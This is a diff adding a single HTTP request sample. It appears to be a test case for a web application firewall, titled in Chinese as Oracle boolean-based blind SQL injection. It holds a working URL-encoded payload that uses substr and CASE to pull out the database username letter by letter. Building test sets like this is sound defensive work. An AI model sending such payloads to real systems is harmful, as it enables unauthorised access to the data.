@@ -1,0 +1,9 @@
+# SQL注入_GET_oracle_布尔注入-06506313
+# 攻击者基于布尔查询，将"(select case when 'S' = substr(user,1,1) then (select count(*) from system.help) else 0 end from dual)"语句注入到 SQL 查询参数中，利用函数substr截取用户名每个字母，CASE语句进行条件判断以获取当前用户名信息。
+GET /?id=1%20and%20919=%28select%20case%20when%20%27S%27%20=%20substr%28user%2C1%2C1%29%20then%20%28select%20count%28%2A%29%20from%20system.help%29%20else%200%20end%20from%20dual%29&bid=hd_tag_m8mv240n HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv240n
+RM-PRO-Token: 30613f46156db9c917c08d4b2b5b8a98
+RM-PRO-Time: 1742808356340
+User-Agent: curl/7.83.1
+
